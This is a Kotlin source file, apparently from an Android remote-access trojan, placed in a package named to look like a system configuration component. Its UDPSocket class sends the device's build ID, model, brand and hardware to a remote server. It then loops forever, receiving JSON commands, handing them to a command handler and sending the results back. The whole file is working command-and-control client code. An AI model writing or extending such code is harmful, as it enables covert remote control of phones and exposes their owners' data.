package com.android.system.config

import android.content.Context
import android.os.Build
import android.util.Log
import androidx.annotation.RequiresApi
import com.google.gson.Gson
import java.net.DatagramPacket
import java.net.DatagramSocket
import java.net.InetAddress

class UDPSocket {
    //send message to server function
    fun sendMSG(socket: DatagramSocket, message: String, ip:String, port:Int){
        val serverAddress = InetAddress.getByName(ip)
        val sendData = message.toByteArray()
        val sendPacket = DatagramPacket(sendData, sendData.size, serverAddress, port)
        socket.send(sendPacket)
    }

    //main socket working function
    @RequiresApi(Build.VERSION_CODES.LOLLIPOP)
    fun startSocket(context: Context, serverIp:String, serverPort:Int){
        Thread {
            //gson for converting json string into kotlinn object
            val gson = Gson()
            try {
                val socket = DatagramSocket()
                //sending initial connection string
                sendMSG(socket, "{\"type\":\"c\",\"uniqueid\":\"${Build.ID}\",\"os\":\"android\",\"name\":\"${Build.MODEL}|${Build.BRAND}|${Build.HARDWARE}\"}", serverIp, serverPort)//send1 initial

                while (true) {
                  //listen for message from server everytime
                    val receiveData = ByteArray(1024)
                    val receivePacket = DatagramPacket(receiveData, receiveData.size)
                    socket.receive(receivePacket)
                    val response = String(receivePacket.data, 0, receivePacket.length)
                    val received:Command = gson.fromJson(response,Command::class.java)
                    val finalresponse = ManageCommand().manageMessage(context,received.cmd,received.to)
                  //send back to server  
                  sendMSG(socket,finalresponse,serverIp,serverPort)
                }

            } catch (e: Exception) {
                Log.d("check1", "$e")
            }
        }.start()
    }

    //data class to convert json string into kotlin object
    data class Command(var cmd:String, var to:String)
}
